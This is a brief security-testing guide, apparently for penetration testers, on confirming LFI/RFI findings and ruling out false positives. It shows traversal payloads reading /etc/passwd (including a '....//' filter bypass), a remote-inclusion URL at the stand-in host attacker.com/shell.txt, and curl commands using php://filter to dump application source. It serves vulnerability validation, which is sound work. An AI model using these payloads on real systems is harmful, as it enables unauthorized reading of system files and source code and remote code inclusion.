# LFI/RFI False Positive Validation

## Common False Positives

### 1. Path Traversal Shows Default Error Page
```bash
../../../etc/passwd → 200 with HTML page
```
The HTML page might be the app's 404/default page, not the actual file.

**Confirm:** Look for "/etc/passwd" content format (root:x:0:0:root:...) NOT HTML tags.

### 2. ../ Stripped But No Read
Server strips `../` but doesn't read any file — returns empty string.
```bash
....//....//....//etc/passwd → stripped to ../../../etc/passwd → 200 empty
```
If response is empty, no file was read.

### 3. RFI Failed (allow_url_include Off)
```bash
http://attacker.com/shell.txt → 500 error
```
PHP's `allow_url_include` must be On for RFI.

## Confirmation Criteria
| Signal | Confident? |
|--------|------------|
| File content readable in response (not HTML) | ✅ Confirmed |
| php://filter returns base64 content | ✅ Confirmed |
| Windows INI file content returned | ✅ Confirmed |
| Empty response or HTML page | ❌ Inconclusive |
| Same response for any path | ❌ False Positive |

## Validation Flow
```bash
# Step 1: Confirm file inclusion (not error page)
curl "https://target.com/page?file=../../../etc/passwd"
# Check for "root:x:0:0:" pattern

# Step 2: PHP wrapper test
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"

# Step 3: Confirm different files return different content
curl "https://target.com/page?file=../../../etc/hostname"
curl "https://target.com/page?file=../../../etc/passwd"
```
